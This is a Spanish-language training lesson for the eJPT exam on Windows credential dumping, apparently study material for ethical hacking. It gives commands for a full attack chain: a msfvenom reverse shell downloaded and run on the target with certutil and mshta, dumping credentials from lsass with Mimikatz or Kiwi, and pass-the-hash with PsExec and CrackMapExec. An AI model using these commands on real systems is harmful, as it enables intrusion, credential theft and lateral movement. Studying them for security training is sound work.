# Windows Credential Dumping

Esta lección cubre cómo Windows almacena contraseñas, cómo los atacantes las extraen y cómo usan las credenciales capturadas para moverse lateralmente — técnicas críticas para el eJPT.

> ⚠️ **Nota**: Todas las técnicas requieren una **sesión Meterpreter elevada/administrativa** en el objetivo. Reemplaza las IPs y valores con los tuyos reales.

---

## Cómo Windows Almacena las Contraseñas

### La Base de Datos SAM

La base de datos **SAM (Security Accounts Manager)** almacena todos los hashes de contraseñas de cuentas de usuario locales en Windows. Datos clave:

- El archivo SAM está en `C:\Windows\System32\config\SAM`.
- **No puede copiarse mientras Windows está en ejecución** — el kernel NT lo mantiene bloqueado.
- En versiones modernas de Windows, la base de datos SAM está **cifrada con syskey**.
- Los atacantes usan **técnicas en memoria** para volcar hashes del **proceso LSASS** en lugar de acceder directamente al archivo.
- La autenticación y verificación de credenciales es gestionada por **LSA (Local Security Authority)**, que corre como el proceso `lsass.exe`.

> ⚠️ Necesitas una **sesión elevada/admin** para volcar hashes de SAM o LSASS.

### Tipos de Hash

| Tipo de Hash | Usado En | Algoritmo | Debilidades |
|-------------|---------|-----------|------------|
| **LM (LanMan)** | Windows XP y anteriores / Server 2003 | DES | Sin salt, divide la contraseña en dos trozos de 7 chars, convierte a mayúsculas — fácilmente crackeado con rainbow tables |
| **NTLM** | Windows Vista en adelante | MD4 | Sin salt — ataques de fuerza bruta y rainbow tables siguen siendo efectivos, pero más fuerte que LM |

**Proceso de hashing LM** (por qué es débil):
1. La contraseña se divide en dos **trozos de 7 caracteres**.
2. Todos los caracteres se convierten a **mayúsculas** (reduce a la mitad el espacio de claves).
3. Cada trozo se hashea **por separado** con DES.
4. Sin salt — contraseñas idénticas siempre producen hashes idénticos.

**Mejoras de NTLM sobre LM**:
- **No** divide el hash.
- Es **sensible a mayúsculas/minúsculas**.
- Soporta **símbolos y caracteres Unicode**.
- Sigue **sin salt** — rainbow tables y fuerza bruta siguen siendo viables.

---

## 1. Búsqueda de Contraseñas en Archivos de Configuración

### ¿Qué son los Archivos de Instalación Desatendida?

Windows puede automatizar despliegues masivos del SO mediante la utilidad **Unattended Windows Setup**. Usa archivos de configuración que contienen ajustes del sistema y — críticamente — **la contraseña de la cuenta Administrador**.

Si estos archivos quedan en el sistema tras la instalación, los atacantes pueden leer las credenciales del Administrador directamente.

**Ubicaciones comunes**:

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

Las contraseñas pueden estar almacenadas en **codificación Base64** (no cifradas — solo codificadas, trivialmente reversible).

### Paso 1: Entregar y Ejecutar un Payload

Generar un payload en Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<tu_ip> \
  LPORT=1234 \
  -f exe > payload.exe
```

Hospedarlo con un servidor web Python:

```bash
python3 -m http.server 80
```

Descargarlo en el objetivo mediante el símbolo del sistema:

```cmd
certutil -urlcache -f http://<tu_ip>/payload.exe payload.exe
payload.exe
```

### Paso 2: Configurar el Listener

```bash
msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <tu_ip>
msf6 > set LPORT 1234
msf6 > exploit -j
```

### Paso 3: Encontrar el Archivo Unattend.xml

Una vez que tienes una sesión Meterpreter, busca el archivo:

```bash
meterpreter > search -f Unattend.xml
meterpreter > download C:\\Windows\\Panther\\Unattend.xml
```

### Paso 4: Decodificar la Contraseña Base64

**En Kali** (Linux):

```bash
echo "QWRtaW5AMTIz" | base64 -d
```

**En el objetivo** (PowerShell):

```powershell
$password = 'QWRtaW5AMTIz'
$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

### Paso 5: Usar las Credenciales

**Opción A — Abrir cmd como admin en el objetivo**:

```cmd
runas.exe /user:administrator cmd
```

**Opción B — Obtener shell Meterpreter vía hta_server**:

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 > set LHOST <tu_ip>
msf6 > exploit
# Copiar la URL generada, luego en el objetivo:
mshta.exe http://<tu_ip>:<puerto>/payload.hta
```

### Paso 6: Encontrar Archivos de Config con PowerSploit (Alternativa)

Si ya tienes una sesión, usa **PowerUp** de PowerSploit para auditar rutas de escalada de privilegios incluyendo archivos desatendidos:

```powershell
cd C:\Users\<usuario>\Desktop\PowerSploit\Privesc\
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

PowerUp marcará `Unattend.xml` si se encuentra y mostrará la contraseña codificada.

---

## 2. Volcado de Hashes con Mimikatz / Kiwi

### ¿Qué es Mimikatz?

**Mimikatz** es una potente herramienta de post-explotación para Windows que extrae:
- **Contraseñas en texto claro** (si WDigest está habilitado)
- **Hashes NTLM**
- **Tickets Kerberos**

Todo desde la **memoria del proceso `lsass.exe`**, donde Windows cachea las credenciales.

**Kiwi** es el puerto de Mimikatz para Metasploit/Meterpreter — misma funcionalidad, integrada en tu sesión.

> Necesitas **migrar a un proceso de 64 bits** y tener **privilegios SYSTEM** antes de volcar.

### Método A: Kiwi (vía Meterpreter)

#### Paso 1: Obtener una Sesión Meterpreter Admin

Explotar un servicio (ej. BadBlue en el puerto 80):

```bash
msfconsole
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <tu_ip>
msf6 > exploit
```

#### Paso 2: Migrar a LSASS

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
```

Migrar a `lsass.exe` te da los privilegios más altos del sistema (`NT AUTHORITY\SYSTEM`).

#### Paso 3: Cargar Kiwi y Volcar Credenciales

```bash
meterpreter > load kiwi

# Volcar todas las credenciales (texto claro + hashes + tickets Kerberos)
meterpreter > creds_all

# Volcar solo los hashes de la base de datos SAM
meterpreter > lsa_dump_sam

# Volcar secretos LSA (contraseñas de cuentas de servicio, credenciales de dominio cacheadas)
meterpreter > lsa_dump_secrets
```

### Método B: Ejecutable Mimikatz (vía Shell)

Si prefieres usar el binario standalone de Mimikatz:

#### Paso 1: Subir Mimikatz al Objetivo

```bash
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Users\\admin\\AppData\\Local\\Temp\\mimikatz.exe
meterpreter > shell
```

#### Paso 2: Ejecutar Mimikatz

```cmd
C:\> C:\Users\admin\AppData\Local\Temp\mimikatz.exe
```

#### Paso 3: Habilitar Privilegios de Depuración

```
mimikatz # privilege::debug
```

Salida: `Privilege '20' OK` — confirma que tienes el privilegio de depuración requerido.

#### Paso 4: Volcar Credenciales

```
# Volcar base de datos SAM (hashes NTLM de usuarios locales)
mimikatz # lsadump::sam

# Volcar secretos LSA (credenciales de dominio cacheadas, cuentas de servicio)
mimikatz # lsadump::secrets

# Volcar contraseñas en texto claro de memoria (requiere WDigest habilitado)
mimikatz # sekurlsa::logonpasswords
```

### Comparativa Kiwi vs Mimikatz

| Función | Kiwi (Meterpreter) | Mimikatz (Ejecutable) |
|---------|-------------------|----------------------|
| **Configuración** | `load kiwi` — instantáneo | Subir binario, bajar al shell |
| **Riesgo de detección** | Menor (corre en memoria) | Mayor (binario en disco) |
| **Contraseñas en texto claro** | `creds_all` | `sekurlsa::logonpasswords` |
| **Hashes SAM** | `lsa_dump_sam` | `lsadump::sam` |
| **Secretos LSA** | `lsa_dump_secrets` | `lsadump::secrets` |

### Volcado Rápido de Hashes (Meterpreter)

Si solo necesitas los hashes NTLM rápidamente:

```bash
meterpreter > hashdump
```

Formato de salida: `usuario:uid:LM_hash:NTLM_hash:::`

Ejemplo:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
- Los primeros 32 chars después de `:500:` = **hash LM** (generalmente vacío/por defecto en Windows moderno)
- Los últimos 32 chars = **hash NTLM** (lo que necesitas para Pass-the-Hash)

---

## 3. Ataques Pass-the-Hash (PTH)

### ¿Qué es Pass-the-Hash?

**Pass-the-Hash** es una técnica de movimiento lateral donde usas un **hash NTLM capturado directamente** para autenticarte — sin nunca crackear ni conocer la contraseña en texto plano. La autenticación NTLM de Windows acepta el hash en sí mismo como prueba de identidad.

**Por qué funciona**: La autenticación NTLM es basada en desafío-respuesta. El hash se usa para cifrar un desafío del servidor — así que si tienes el hash, puedes responder correctamente sin conocer la contraseña.

### Método A: Módulo PsExec (Metasploit)

```bash
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target_ip>
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <tu_ip>
msf6 > exploit
```

Formato de `SMBPass`: `LM_hash:NTLM_hash`

Si solo tienes el hash NTLM, usa el hash LM vacío por defecto:
```
aad3b435b51404eeaad3b435b51404ee:<tu_hash_NTLM>
```

### Método B: CrackMapExec

CrackMapExec es más rápido para probar credenciales en múltiples objetivos:

```bash
# Autenticarse y ejecutar un comando con PTH
crackmapexec smb <target_ip> -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c" -x "whoami"

# Probar en toda una subred
crackmapexec smb 192.168.1.0/24 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"
```

Una autenticación exitosa muestra `(Pwn3d!)` en la salida.

**Flags**:
- `-u`: Nombre de usuario
- `-H`: Hash NTLM (no se requiere hash LM)
- `-x`: Comando a ejecutar en el objetivo

---

## Cadena de Ataque Completa

```
Explotar Servicio → Sesión Meterpreter → Migrar a LSASS → Volcar Hashes → Pass-the-Hash → Nueva Sesión
```

| Paso | Acción | Herramienta |
|------|--------|------------|
| **1** | Explotar servicio vulnerable | Metasploit |
| **2** | Obtener sesión Meterpreter | Metasploit |
| **3** | Migrar a `lsass.exe` | `migrate <pid>` |
| **4** | Volcar hashes | Kiwi / Mimikatz / `hashdump` |
| **5** | Usar hashes para movimiento lateral | PsExec / CrackMapExec |

---

## Puntos Clave

- La **base de datos SAM** almacena hashes NTLM de usuarios locales — bloqueada por el kernel mientras Windows corre, accesible vía LSASS en memoria.
- Los **hashes LM** son débiles — sin salt, divide la contraseña en dos trozos de 7 chars en mayúsculas. Solo en Windows XP/Server 2003 y anteriores.
- Los **hashes NTLM** se usan desde Vista en adelante — más fuertes que LM pero siguen siendo vulnerables a fuerza bruta y rainbow tables (sin salt).
- Los archivos **Unattend.xml** dejados tras instalaciones automáticas de Windows pueden contener la contraseña del Administrador en **codificación Base64** — trivialmente reversible.
- Busca `Unattend.xml` en `C:\Windows\Panther\` — usa `search -f` en Meterpreter o `Invoke-PrivescAudit` con PowerUp.
- **Mimikatz / Kiwi** extraen hashes y contraseñas en texto claro de la memoria de `lsass.exe` — migra a LSASS primero para privilegios SYSTEM.
- **`privilege::debug`** debe ejecutarse en Mimikatz antes de volcar — confirma que los privilegios de depuración están activos.
- **`sekurlsa::logonpasswords`** vuelca contraseñas en texto claro — solo funciona si la autenticación WDigest está habilitada en el objetivo.
- **`hashdump`** en Meterpreter vuelca rápidamente todos los hashes NTLM locales — formato `usuario:uid:LM:NTLM:::`.
- **Pass-the-Hash** usa hashes NTLM capturados directamente para la autenticación — sin necesidad de crackear contraseñas.
- **PsExec** (`exploit/windows/smb/psexec`) acepta `LM_hash:NTLM_hash` en `SMBPass`.
- **CrackMapExec** prueba PTH en múltiples objetivos simultáneamente — `(Pwn3d!)` confirma auth exitosa.
- Siempre **migra a un proceso estable de 64 bits** (como `lsass.exe` o `explorer.exe`) antes de ejecutar herramientas de volcado de credenciales.
